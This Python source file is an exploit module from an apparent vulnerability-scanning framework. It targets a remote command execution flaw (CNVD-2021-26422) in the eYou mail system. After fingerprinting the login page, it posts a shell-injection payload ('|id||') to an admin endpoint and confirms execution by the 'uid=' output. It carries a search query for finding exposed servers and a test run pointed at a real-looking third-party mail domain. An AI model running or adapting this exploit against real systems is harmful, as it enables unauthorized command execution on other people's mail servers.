# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 15:22

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# app="eYou-邮件系统" && (port="80" || port="443")
class Script(BaseScript):
    name = 'Eyou Mail'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'CNVD-2021-26422'
        # 来源
        self.refer = 'https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g'
        # 特定路径判断
        self.detectPathList = ['/']
        # exec
        self.execPathList = ['/webadm/?q=moni_detail.do&action=gragh']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['e186e2e55812321359d1c68ac27da9f1']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if '/tpl/login/user/js/login.js' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Eyou Mail Finger', url))
                            return {'name': 'Eyou Mail Finger', 'url': url, 'software': 'Eyou Mail'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = "type='|id||'"
                async with self.session.post(url=url, headers=headers, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'uid=' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Eyou Mail RCE', url))
                            return {'name': 'Eyou Mail RCE', 'url': url, 'software': 'Eyou Mail'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    # resp = requests.get('http://124.127.43.25/php/user/images/laji05.gif', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('mail.tcxxwy.com', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
